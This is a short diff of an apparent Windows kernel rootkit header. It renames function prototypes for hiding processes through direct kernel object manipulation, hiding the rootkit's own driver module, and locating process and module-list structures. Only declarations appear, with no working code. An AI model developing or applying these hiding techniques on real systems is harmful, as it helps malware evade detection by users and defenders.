@@ -7,9 +7,9 @@
 BOOLEAN OnProcessHide(IN ULONG pid);
 ULONG FindProcessEPROCByPid( int terminate_PID );
 ULONG FindProcessEPROCByName(char procName[]);
-BOOLEAN HideProcessFromProcessList( PEPROCESS eproc);
-BOOLEAN HideModule();
-ULONG FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject);
+VOID DKOM_HideProcess( PEPROCESS eproces );
+BOOLEAN HideRootkitModule();
+ULONG GetModuleListBegin (IN PDRIVER_OBJECT  DriverObject);
 PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName);
 
 
